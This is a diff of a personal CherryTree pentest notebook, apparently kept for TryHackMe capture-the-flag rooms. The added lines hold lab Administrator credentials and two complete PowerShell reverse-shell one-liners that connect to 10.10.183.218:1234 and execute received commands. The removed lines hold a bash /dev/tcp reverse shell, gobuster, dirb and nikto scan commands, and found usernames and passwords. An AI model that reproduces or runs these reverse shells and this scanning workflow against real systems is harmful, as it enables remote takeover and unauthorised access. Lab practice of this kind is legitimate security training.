     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
@@ -2822,39 +3408,15 @@ UPLOAD EXPLOITATION:
 </rich_text>
     <rich_text indent="2">Enumerate file length filters with the legitimate file. </rich_text>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699286992">
-    <rich_text>10.10.176.118
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699550023">
+    <rich_text>10.10.183.218
+=================
+10.10.117.183
+Username: Administrator
+Password: TryH4ckM3!
 
-10.10.114.163
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.183.218',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-Apache/2.4.18
-
-Username: R1ckRul3s
-pass: Wubbalubbadubdub
-
-gobuster dir --url http://10.10.114.163/ -w
-dirb http://10.10.114.163/
-nikto -h 10.10.114.163
-
-
-http://10.10.114.163/
-assets/
-server-status/
-robots.txt -&gt; Wubbalubbadubdub
-login.php
-
-bash -i &gt;&amp; /dev/tcp/10.10.176.118/1234 0&gt;&amp;1
-
-/Sup3rS3cretPickl3Ingred.txt
-/assets
-/clue.txt
-/denied.php
-/portal.php
-
-users:
-ubuntu
-rick
-
-second ingredients</rich_text>
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.183.218',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</rich_text>
   </node>
 </cherrytree>
